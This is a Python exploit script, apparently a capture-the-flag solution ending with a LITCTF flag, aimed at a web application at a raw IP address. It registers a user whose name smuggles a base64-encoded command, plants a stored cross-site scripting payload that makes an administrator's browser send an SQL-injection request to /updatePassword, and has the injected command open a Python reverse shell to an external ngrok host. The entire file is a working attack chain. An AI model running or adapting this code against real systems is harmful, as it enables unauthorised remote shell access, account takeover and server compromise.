import requests
import base64
import random
import time

url = "http://34.44.129.8:56270"
raw_command = b"""python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("0.tcp.jp.ngrok.io",18025));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'"""
command = f"echo {base64.b64encode(raw_command).decode()} | base64 -d | sh"
username = f"; {command} #{str(random.randint(1000, 9999))}"

payload = """
<script>
fetch("/updatePassword", {
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    body: "newPassword=123', admin=1  WHERE username='""" + username + """' -- "
});
</script>
"""

with requests.Session() as s:
    s.post(url + "/signup", data={
        "email": "1@1.com",
        "name": username,
        "password": "1",
        "confirm": "1"
    })
    s.post(url + "/login", data={
        "name": username,
        "password": "1"
    })
    print(s.post(url + "/contact", data={
        "comment": payload
    }).status_code)

    print("waiting for admin to check the website...")
    time.sleep(10)  # Admin frequently checks the website.

    print(s.post(url + "/resetDB").status_code)

# LITCTF{us3rn4m3_1nj3c710n_7f62be7ddc0d597f}
